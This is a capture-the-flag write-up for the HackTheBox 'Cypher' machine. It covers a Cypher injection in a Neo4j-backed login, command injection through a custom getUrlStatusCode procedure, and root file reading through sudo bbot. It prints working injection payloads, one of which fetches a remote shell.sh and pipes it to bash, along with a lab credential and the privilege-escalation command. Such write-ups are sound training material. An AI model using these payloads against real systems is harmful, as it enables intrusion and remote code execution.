---
title: Cypher
tags:
  - HackTheBox
  - Medium
  - Linux
  - jar
  - Cypher_Injection
  - bbot
date: 2025-03-04T00:00:00Z
---
![](Pasted%20image%2020250304095556.png)

## Reconnaissance

First, I added the new host to my known ones:

```shell
sudo echo "10.10.11.57 cypher.htb" | sudo tee -a /etc/hosts
```

Then, I performed a Nmap scan:

```shell
nmap -sC -T4 -p- cypher.htb > sC.txt

[redacted]
PORT   STATE SERVICE
22/tcp open  ssh
| ssh-hostkey: 
|   256 be:68:db:82:8e:63:32:45:54:46:b7:08:7b:3b:52:b0 (ECDSA)
|_  256 e5:5b:34:f5:54:43:93:f8:7e:b6:69:4c:ac:d6:3d:23 (ED25519)
80/tcp open  http
|_http-title: GRAPH ASM
```

So I checked its website:

![](Pasted%20image%2020250304095710.png)

I found a weird comment inside the source code:

![](Pasted%20image%2020250304095835.png)

I performed some enumeration with [dirsearch 📁](/notes/tools/dirsearch.md) and got the `/testing` endpoint:

```shell
dirsearch -u http://cypher.htb

[redacted]
[09:57:55] 301 -  178B  - /testing  ->  http://cypher.htb/testing/
```

![](Pasted%20image%2020250304100043.png)

There's a `.jar` inside of it, so I'll download it and extract its content using [Java Decompiler](https://java-decompiler.github.io/):

![](Pasted%20image%2020250304100526.png)

There is a file called `CustomFunctions.class` where there is a code that performs an http request and returns the status code:

![](Pasted%20image%2020250304101817.png)

## Weaponization

This is a nice hint for use to exploit a Cypher injection. I found this interesting blog from [Pentester Land](https://pentester.land/blog/cypher-injection-cheatsheet/) which talks about this and also [Varonis.com](https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits). So I captured the login request and tried to find a cypher injection:

![](Pasted%20image%2020250304102345.png)

![](Pasted%20image%2020250304102404.png)

> I confirmed the injection :D

## Exploitation

So now what I need to do is to call the `getUrlStatusCode()` function decompiled from the jar to inject a malicious payload and gain RCE:

```shell
{"username":"a' return h.value as a UNION CALL custom.getUrlStatusCode(\"10.10.14.5:666#\") YIELD statusCode AS a RETURN a;//","password":"a"}
```

![](Pasted%20image%2020250304103457.png)

![](Pasted%20image%2020250304103512.png)

Got a callback, so now I'll create a bash reverse shell on my machine, then create a server, upload the shell to the machine using the previous PoC and piping it to bash:

```shell
{"username":"a' return h.value as a UNION CALL custom.getUrlStatusCode(\"cypher.htb;curl 10.10.14.5:8090/shell.sh|bash;#\") YIELD statusCode AS a RETURN a;//","password":"a"}
```

> Got a reverse shell :D

![](Pasted%20image%2020250304103841.png)

## Pivoting

I got a shell as `neo4j` so now I'll try to become user `graphasm`. Inside of `/home/graphasm` there is a file called `bbot_preset.yml` which contains the following credentials: `neo4j:cU4btyib.20xtCMCXkBmerhK`.

> I can now login and get user flag

### User flag

![](Pasted%20image%2020250304104754.png)

## Privilege Escalation

I made a quick search about **bbot** and found [bbot's github](https://github.com/blacklanternsecurity/bbot). Then i made a quick search of where the binary was installed:

```shell
which bbot
/usr/local/bin/bbot
```

So then I executed the help of the program and got three interesting flags:

```shell
/usr/local/bin/bbot -h

[redacted]
-c [CONFIG ...], --config [CONFIG ...]  Custom config options in key=value format: e.g. 'modules.shodan.api_key=1234'

-y, --yes             Skip scan confirmation prompt

-d, --debug           Enable debugging

--dry-run             Abort before executing scan
```

So combining all I can read root flag:

```shell
sudo /usr/local/bin/bbot -cy /root/root.txt -d --dry-run
```

### Root flag

![](Pasted%20image%2020250304110207.png)

==Machine pwned!==